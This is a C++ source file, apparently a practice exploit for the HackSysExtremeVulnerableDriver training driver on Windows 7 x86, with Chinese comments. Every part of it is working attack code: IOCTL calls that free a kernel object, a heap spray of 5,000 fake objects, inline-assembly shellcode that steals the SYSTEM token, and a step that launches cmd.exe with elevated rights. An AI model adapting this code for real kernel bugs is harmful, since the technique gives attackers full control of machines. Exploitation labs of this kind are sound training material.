// 1UAF.cpp : 定义控制台应用程序的入口点。
//
// iam0xcc
//测试环境 win7 x86 sp1 
//virtualBox 5.1

#include "stdafx.h"
#include<Windows.h>

typedef void (*FunctionPointer)();
typedef struct _tagUAF
{
	FunctionPointer callback;
	CHAR Buffer[0x54];
}_UAF,*P_UAF;


void shellCode()
{
	__asm
	{
		nop;
		pushad;
		mov eax,fs:[0x124];//currentThread
		mov eax,[eax+0x150];//currentProcess
		mov ecx,eax;
		mov edx,4;

find_sys_pid:
		mov eax,[eax+0xb8];//activeProcess
		sub eax,0xb8;//eprocess
		cmp [eax+0xb4],edx;
		jnz find_sys_pid;
		//find it
		mov eax,[eax+0xf8];//system token
		mov [ecx+0xf8],eax;//copy to my process

		popad;
	}
}
void CreateCmdProcess()
{
	STARTUPINFO si={0};
	PROCESS_INFORMATION pi={0};
	si.dwFlags=STARTF_USESHOWWINDOW;
	si.wShowWindow=SW_SHOW;
	WCHAR wzFilePath[MAX_PATH]={L"cmd.exe"};
	bool bret=CreateProcessW(NULL,wzFilePath,NULL,NULL,false,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
	if (bret)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

int main()
{
	HANDLE hDevice=CreateFileA("\\\\.\\\HackSysExtremeVulnerableDriver",GENERIC_READ|GENERIC_WRITE,
		NULL,
		NULL,OPEN_EXISTING,NULL,NULL);
	printf("get handle");
	if (hDevice==NULL || hDevice==INVALID_HANDLE_VALUE)
	{
		printf("get hanle error");
	}
	DWORD recvSize=0;
	printf("allocate UAF object");
	DeviceIoControl(hDevice,0x222013,NULL,NULL,NULL,0,&recvSize,NULL);
	
	printf("free uaf object\n");
	DeviceIoControl(hDevice,0x22201B,NULL,NULL,NULL,0,&recvSize,NULL);

	//精心构造数据
	P_UAF uaf=(P_UAF)malloc(sizeof(_UAF));
	uaf->callback=shellCode;
	memset(uaf->Buffer,0x41,0x54);

	//heap spray
	printf("begin heap spary");
	for (int i=0;i<5000;i++)
	{
		DeviceIoControl(hDevice,0x22201F,uaf,sizeof(_UAF),NULL,0,&recvSize,NULL);
	}
	//然后构造调用
	DeviceIoControl(hDevice,0x222017,NULL,NULL,NULL,0,&recvSize,NULL);
	//进行验证
	CreateCmdProcess();
	
	getchar();
	return 0;
}